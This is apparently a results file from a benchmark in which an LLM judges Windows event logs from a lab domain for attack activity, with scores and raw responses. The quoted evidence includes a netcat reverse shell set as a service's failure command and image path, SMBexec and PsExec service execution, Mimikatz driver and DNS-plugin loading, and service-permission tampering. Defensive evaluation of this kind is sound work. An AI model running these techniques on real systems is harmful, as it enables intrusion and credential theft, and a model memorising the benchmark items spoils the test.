# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
gpt-5.5-2026-04-23,ID4688-Service permissions modified (registry).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\svchost.exe","admmig, WIN10-02$","reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security"" /v Security /t REG_BINARY /d fe340ead, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",win10-02.offsec.lan,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security,0.0,10.90,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, WIN10-02$
- Commands: reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security"" /v Security /t REG_BINARY /d fe340ead, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
- Network: win10-02.offsec.lan
- Registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security

EXPLANATION:
The account admmig used reg.exe from cmd.exe to modify the Security value under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security. Shortly afterward, dllhost.exe was launched under WIN10-02$ with TargetUserName admmig, which suggests a suspicious sequence involving service security modification followed by elevated COM-related process execution."
gpt-5.5-2026-04-23,ID4688-Service permissions modified (sc).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe",admmig,"sc  sdset xboxgip ""D:(A | CCLCSWRPWPDTLOCRRC | SY)",,,0.0,14.51,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: sc  sdset xboxgip ""D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)
- Network: None
- Registry: None

EXPLANATION:
The event shows C:\Windows\System32\sc.exe launched from C:\Windows\System32\cmd.exe by admmig to run an sdset command against the xboxgip service. Modifying a service security descriptor with sc sdset can indicate service permission tampering, which is suspicious administrative behavior in this event."
gpt-5.5-2026-04-23,ID4697-New service for Mimikatz.evtx,easy,A,processed,YES,100.0,83.3,YES,"1102, 4697",C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys,"admmig, LocalSystem",,jump01.offsec.lan,,0.0,6.70,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4697
- Processes: C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys
- Accounts: admmig, LocalSystem
- Commands: None
- Network: jump01.offsec.lan
- Registry: None

EXPLANATION:
The Security event log was cleared by admmig, followed seconds later by installation of the mimidrv service using C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys. The combination of log clearing and Mimikatz driver service installation under LocalSystem indicates malicious credential theft or post-exploitation activity."
gpt-5.5-2026-04-23,ID7045-4697-SMBexec service registration.evtx,easy,A,processed,YES,100.0,87.5,YES,"7045, 4697","%COMSPEC%, %TEMP%\execute.bat","LocalSystem, admmig",%COMSPEC% /Q /c echo cd  ^&gt | \\127.0.0.1\C$\__output 2^&gt | ^&amp | 1 &gt | %TEMP%\execute.bat &amp | %COMSPEC% /Q /c %TEMP%\execute.bat &amp | del %TEMP%\execute.bat,"rootdc1.offsec.lan, 127.0.0.1",,0.0,12.41,5.2,6.0,4.0,3,18.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7045, 4697
- Processes: %COMSPEC%, %TEMP%\execute.bat
- Accounts: LocalSystem, admmig
- Commands: %COMSPEC% /Q /c echo cd  ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat
- Network: rootdc1.offsec.lan, 127.0.0.1
- Registry: None

EXPLANATION:
The logs show service creation events 7045 and 4697 for service BTOBTO running as LocalSystem, created by admmig. The service command uses %COMSPEC% to create and execute a temporary batch file and redirect output to \\127.0.0.1\C$\__output, which is consistent with suspicious command execution via a newly installed service."
gpt-5.5-2026-04-23,ID7045-7036 PSexec service installation.evtx,easy,A,processed,YES,100.0,100.0,YES,"104, 7045, 7036","PSEXESVC, %SystemRoot%\PSEXESVC.exe","admmig, LocalSystem",,jump01.offsec.lan,,0.0,11.30,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 104, 7045, 7036
- Processes: PSEXESVC, %SystemRoot%\PSEXESVC.exe
- Accounts: admmig, LocalSystem
- Commands: None
- Network: jump01.offsec.lan
- Registry: None

EXPLANATION:
The System log was cleared by admmig, followed seconds later by installation and execution of the PSEXESVC service as LocalSystem. The rapid sequence of log clearing and PsExec service creation/running/stopped behavior is consistent with suspicious remote execution and evidence removal activity."
gpt-5.5-2026-04-23,ID7045-New service for Mimikatz +npcap.evtx,easy,A,processed,YES,100.0,81.8,YES,7045,"test.exe, OfficeClickToRun.exe, MicrosoftSearchInBing.exe, npcap.sys, mimidrv.sys",LocalSystem,"D:\Service\test.exe, ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service, ""C:\Program Files\Microsoft\Microsoft Search in Bing\MicrosoftSearchInBing.exe"", \SystemRoot\system32\DRIVERS\npcap.sys, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys",jump01.offsec.lan,,16.7,12.74,4.9,6.0,3.3,4,18.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7045
- Processes: test.exe, OfficeClickToRun.exe, MicrosoftSearchInBing.exe, npcap.sys, mimidrv.sys
- Accounts: LocalSystem
- Commands: D:\Service\test.exe, ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service, ""C:\Program Files (x86)\Microsoft\Microsoft Search in Bing\MicrosoftSearchInBing.exe"", \SystemRoot\system32\DRIVERS\npcap.sys, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys
- Network: jump01.offsec.lan
- Registry: None

EXPLANATION:
Multiple 7045 service installation events occurred on jump01.offsec.lan, including repeated installation of mimikatz driver (mimidrv) from C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys as an auto start kernel mode driver. The presence of a Mimikatz driver service indicates malicious credential-theft related behavior rather than routine service activity."
gpt-5.5-2026-04-23,ID7045-Random service installation.evtx,easy,A,processed,YES,100.0,83.3,YES,"104, 7045",virusé.exe,"admmig, LocalSystem",,fs02.offsec.lan,,0.0,6.60,5.0,6.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 104, 7045
- Processes: virusé.exe
- Accounts: admmig, LocalSystem
- Commands: None
- Network: fs02.offsec.lan
- Registry: None

EXPLANATION:
The System log was cleared by admmig, followed shortly by installation of a new service named bad-task running as LocalSystem with ImagePath virusé.exe. This pattern of log clearing followed by creation of a suspicious service indicates malicious activity."
gpt-5.5-2026-04-23,ID800-4103-4104-Service abuse with Failure Command.evtx,easy,A,processed,YES,100.0,100.0,YES,"800, 4103, 4104","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe",OFFSEC\admmig,"Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447"", Microsoft.PowerShell.Core\Set-StrictMode -Off, prompt","win10-02.offsec.lan, 10.10.14.26",HKLM:\System\CurrentControlSet\services\xboxgip,0.0,18.18,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447"", Microsoft.PowerShell.Core\Set-StrictMode -Off, prompt
- Network: win10-02.offsec.lan, 10.10.14.26
- Registry: HKLM:\System\CurrentControlSet\services\xboxgip

EXPLANATION:
The logs show OFFSEC\admmig using PowerShell to set the xboxgip service FailureCommand registry value to run C:\nc.exe with -e powershell.exe to 10.10.14.26 4447. Modifying a service failure command to execute netcat and spawn PowerShell is attack behavior consistent with persistence or command execution."
gpt-5.5-2026-04-23,ID800-4103-4104-Service abuse with malicious path.evtx,easy,A,processed,YES,100.0,100.0,YES,"800, 4103, 4104","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe",OFFSEC\admmig,"Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447"", Microsoft.PowerShell.Core\Set-StrictMode -Off, prompt","win10-02.offsec.lan, 10.10.14.26",HKLM:\System\CurrentControlSet\services\xboxgip,0.0,11.98,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447"", Microsoft.PowerShell.Core\Set-StrictMode -Off, prompt
- Network: win10-02.offsec.lan, 10.10.14.26
- Registry: HKLM:\System\CurrentControlSet\services\xboxgip

EXPLANATION:
The logs show OFFSEC\admmig using PowerShell to modify the ImagePath of HKLM:\System\CurrentControlSet\services\xboxgip to execute C:\nc.exe with powershell.exe connecting to 10.10.14.26 4447. Changing a service ImagePath to launch nc.exe with an interactive PowerShell payload is consistent with malicious persistence or command execution behavior."
gpt-5.5-2026-04-23,ID800-4103-4104-Service creation (PowerShell).evtx,easy,B,processed,YES,100.0,62.5,YES,"800, 4104, 4103","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, virus.exe",OFFSEC\admmig,"New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""', New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""'",FS03.offsec.lan,,0.0,13.52,3.8,6.0,4.0,3,16.8,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, virus.exe
- Accounts: OFFSEC\admmig
- Commands: New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""', New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""'
- Network: FS03.offsec.lan
- Registry: None

EXPLANATION:
PowerShell was used by OFFSEC\admmig to run New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""', creating a service with a suspicious name and executable. The repeated Event IDs 800, 4104, and 4103 corroborate the same service-creation activity through command line, script block, and module logging."
gpt-5.5-2026-04-23,ID13-WMIimplant registry crash control.evtx,easy,A,processed,YES,100.0,83.3,YES,13,"C:\Windows\system32\services.exe, C:\Windows\system32\wbem\wmiprvse.exe",,,fs03vuln.offsec.lan,"HKLM\System\CurrentControlSet\Services\hacker23\Start, HKLM\System\CurrentControlSet\Services\hacker23\ImagePath, HKLM\System\CurrentControlSet\Control\CrashControl\LogEvent, HKLM\System\CurrentControlSet\Control\CrashControl\SendAlert, HKLM\System\CurrentControlSet\Control\CrashControl\CrashDumpEnabled, HKLM\System\CurrentControlSet\Control\CrashControl\Overwrite, HKLM\System\CurrentControlSet\Control\CrashControl\KernelDumpOnly, HKLM\System\CurrentControlSet\Control\CrashControl\AutoReboot, HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile, HKLM\System\CurrentControlSet\Control\CrashControl\MiniDumpDir",0.0,18.86,5.0,5.0,4.0,2,16.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 13
- Processes: C:\Windows\system32\services.exe, C:\Windows\system32\wbem\wmiprvse.exe
- Accounts: None
- Commands: None
- Network: fs03vuln.offsec.lan
- Registry: HKLM\System\CurrentControlSet\Services\hacker23\Start, HKLM\System\CurrentControlSet\Services\hacker23\ImagePath, HKLM\System\CurrentControlSet\Control\CrashControl\LogEvent, HKLM\System\CurrentControlSet\Control\CrashControl\SendAlert, HKLM\System\CurrentControlSet\Control\CrashControl\CrashDumpEnabled, HKLM\System\CurrentControlSet\Control\CrashControl\Overwrite, HKLM\System\CurrentControlSet\Control\CrashControl\KernelDumpOnly, HKLM\System\CurrentControlSet\Control\CrashControl\AutoReboot, HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile, HKLM\System\CurrentControlSet\Control\CrashControl\MiniDumpDir

EXPLANATION:
The events show service registry values being set for HKLM\System\CurrentControlSet\Services\hacker23\Start and HKLM\System\CurrentControlSet\Services\hacker23\ImagePath. The same log set also shows C:\Windows\system32\wbem\wmiprvse.exe activity labeled technique_id=T1047,technique_name=Windows Management Instrumentation modifying multiple CrashControl registry values, including changing HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile and then setting it back to %%SystemRoot%%\MEMORY.DMP."
gpt-5.5-2026-04-23,ID19-20-WMI registration via PowerLurk.evtx,easy,A,processed,YES,100.0,100.0,YES,"20, 19","cmd.exe, notepad.exe",OFFSEC\admmig,"""cmd.exe /c echo %ProcessId% &gt | &gt | c:\\\\temp\\\\log.txt""",fs01.offsec.lan,,16.7,10.99,6.0,6.0,3.3,3,18.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 20, 19, 19
- Processes: cmd.exe, notepad.exe
- Accounts: OFFSEC\admmig
- Commands: ""cmd.exe /c echo %ProcessId% &gt;&gt; c:\\\\temp\\\\log.txt""
- Network: fs01.offsec.lan
- Registry: None

EXPLANATION:
The events show WMI filter and consumer creation by OFFSEC\admmig using the same Name ""Evil"", with Sysmon labeling the activity as technique_id=T1047,technique_name=Windows Management Instrumentation. The consumer runs cmd.exe when a Win32_ProcessStartTrace query detects notepad.exe, which is a suspicious WMI event subscription pattern."
gpt-5.5-2026-04-23,ID4688-netsh helper DLL.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688","C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe, mimikatz.exe",admmig,netsh  add helper  mimikatz.exe,fs01.offsec.lan,,0.0,6.97,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688
- Processes: C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe, mimikatz.exe
- Accounts: admmig
- Commands: netsh  add helper  mimikatz.exe
- Network: fs01.offsec.lan
- Registry: None

EXPLANATION:
The Security log was cleared by admmig, followed shortly by process creation using C:\Windows\System32\netsh.exe. The command netsh  add helper  mimikatz.exe indicates adding a Mimikatz helper through netsh, which is malicious behavior when paired with log clearing."
gpt-5.5-2026-04-23,ID5136-AdminSDholder backdoor obfuscation (via localizationDisplayId).evtx,easy,B,processed,YES,100.0,50.0,YES,5136,,admmig,,"rootdc1.offsec.lan, offsec.lan",,0.0,13.88,3.0,6.0,4.0,3,16.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5136
- Processes: None
- Accounts: admmig
- Commands: None
- Network: rootdc1.offsec.lan, offsec.lan
- Registry: None

EXPLANATION:
The logs show repeated Event ID 5136 directory object modifications by admmig against CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=offsec,DC=lan. The same attribute, localizationDisplayId, is toggled between AttributeValue 3 and 2 and then reversed minutes later, indicating suspicious paired state changes to an Active Directory extended right rather than routine activity."
gpt-5.5-2026-04-23,ID5136-AdminSDholder permissions changed.evtx,easy,A,processed,YES,100.0,50.0,YES,5136,,admmig,,rootdc1.offsec.lan,,0.0,13.22,3.0,5.0,4.0,3,15.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5136
- Processes: None
- Accounts: admmig
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
Two 5136 events with the same OpCorrelationID show admmig modifying CN=AdminSDHolder,CN=System,DC=offsec,DC=lan nTSecurityDescriptor. The second event adds a new broad access control entry for S-1-5-21-4230534742-2542757381-3142984815-1234, which indicates an AdminSDHolder security descriptor change consistent with privilege persistence."
gpt-5.5-2026-04-23,ID12-LSA Protect mode enabled RunAsPPL.evtx,easy,D,processed,NO,100.0,100.0,YES,"14, 12",,,,WIN10-client01.offsec.lan,,0.0,6.10,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 14, 12
- Processes: None
- Accounts: None
- Commands: None
- Network: WIN10-client01.offsec.lan
- Registry: None

EXPLANATION:
The events are from Microsoft-Windows-Wininit on WIN10-client01.offsec.lan and only show Event IDs 14 and 12 with configuration and level data. There are no processes, accounts, commands, registry keys, or other indicators in the logs suggesting attack behavior."
gpt-5.5-2026-04-23,ID4664-symbolic link created.evtx,easy,A,processed,NO,100.0,100.0,YES,4664,,Admin,,,,0.0,4.33,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4664
- Processes: None
- Accounts: Admin
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The event shows Admin creating a link involving C:\Users\Admin\Downloads\Sysmon\sysmonconf.xml and C:\Users\Admin\Downloads\sysmonconf.xml. There are no processes, commands, network indicators, registry keys, or additional related events showing an attack pattern."
gpt-5.5-2026-04-23,ID150-Failed DLL loaded by DNS server.evtx,easy,A,processed,YES,100.0,100.0,YES,150,.\mimilib.dll,,,rootdc1.offsec.lan,,0.0,9.88,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 150
- Processes: .\mimilib.dll
- Accounts: None
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The DNS Server Service logged repeated Event ID 150 entries referencing .\mimilib.dll on rootdc1.offsec.lan. The use of mimilib.dll with the DNS Server Service is suspicious and consistent with malicious DLL/plugin loading behavior rather than routine DNS activity."
gpt-5.5-2026-04-23,ID4688-DNS DLL serverlevelplugindll command.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\dnscmd.exe, C:\Windows\System32\cmd.exe",admmig,"dnscmd.exe  /config /serverlevelplugindll ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll""",rootdc1.offsec.lan,,0.0,7.78,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\dnscmd.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: dnscmd.exe  /config /serverlevelplugindll ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll""
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The event shows admmig launching C:\Windows\System32\dnscmd.exe from C:\Windows\System32\cmd.exe on rootdc1.offsec.lan. The command configures /serverlevelplugindll to load ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll"", which is attack behavior because it uses dnscmd.exe to configure a DNS server plugin DLL from a Mimikatz-related path."
gpt-5.5-2026-04-23,ID770-Success DLL loaded by DNS server.evtx,easy,A,processed,YES,100.0,100.0,YES,"771, 770",,,,rootdc1.offsec.lan,,0.0,5.35,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 771, 770
- Processes: None
- Accounts: None
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The DNS Server log shows Event ID 770 referencing C:\TOOLS\Mimikatz-fev-2020\mimilib.dll on rootdc1.offsec.lan. Loading a Mimikatz-related DLL through the DNS Server Service is consistent with malicious credential theft or persistence behavior rather than routine DNS activity."
gpt-5.5-2026-04-23,ID4673-Privilege SeMachineAccountPrivilege called.evtx,easy,A,processed,YES,100.0,100.0,YES,4673,C:\Windows\System32\lsass.exe,hack1,,rootdc1.offsec.lan,,0.0,13.87,6.0,2.0,4.0,4,16.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4673
- Processes: C:\Windows\System32\lsass.exe
- Accounts: hack1
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The account hack1 invoked the Security Account Manager service using SeMachineAccountPrivilege through C:\Windows\System32\lsass.exe. Use of SeMachineAccountPrivilege against Security Account Manager is suspicious because it can indicate machine account manipulation rather than routine user activity."
gpt-5.5-2026-04-23,ID4648-4624-RunAsCS login.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4648, 4624, 4688","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe","admmig, test10, FS03$","/c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami","FS03.offsec.lan, localhost, FS03",,0.0,12.21,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4648, 4624, 4688
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe
- Accounts: admmig, test10, FS03$
- Commands: /c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami
- Network: FS03.offsec.lan, localhost, FS03
- Registry: None

EXPLANATION:
The Security log was cleared by admmig in Event ID 1102, followed immediately by PowerShell using explicit credentials for test10 and a successful LogonType 3 logon. The subsequent process chain launched cmd.exe with /c whoami and then whoami.exe under test10, which indicates suspicious post-log-clearing execution activity."
